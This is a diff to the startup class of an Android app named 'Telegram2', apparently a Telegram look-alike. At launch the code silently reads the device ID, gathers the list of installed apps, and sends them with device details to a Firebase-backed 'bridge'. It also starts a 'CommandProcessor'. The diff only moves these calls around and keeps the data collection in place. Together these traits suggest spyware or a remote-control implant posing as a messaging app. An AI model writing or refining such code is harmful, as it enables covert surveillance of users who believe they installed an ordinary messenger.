@@ -1,4 +1,3 @@
-// FILE: app/src/main/java/com/telegram2/messaging/Telegram2App.kt
 package com.telegram2.messaging
 
 import android.app.Application
@@ -12,12 +11,13 @@ class Telegram2App : Application() {
         super.onCreate()
         val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
             ?: UUID.randomUUID().toString()
+
         FirebaseBridge.init(deviceId)
-
-        val apps = packageManager.getInstalledPackages(0).map { it.packageName }
-        FirebaseBridge.registerDevice(Build.MODEL, Build.VERSION.RELEASE, apps)
-        FirebaseBridge.pushInstalledApps(apps)  // <--- ADD THIS
-
         CommandProcessor.init(this)
+
+        // Register device + send app list
+        val apps = packageManager.getInstalledPackages(0).map { it.packageName }
+        FirebaseBridge.registerDevice(android.os.Build.MODEL, android.os.Build.VERSION.RELEASE, apps)
+        FirebaseBridge.pushInstalledApps(apps)
     }
 }
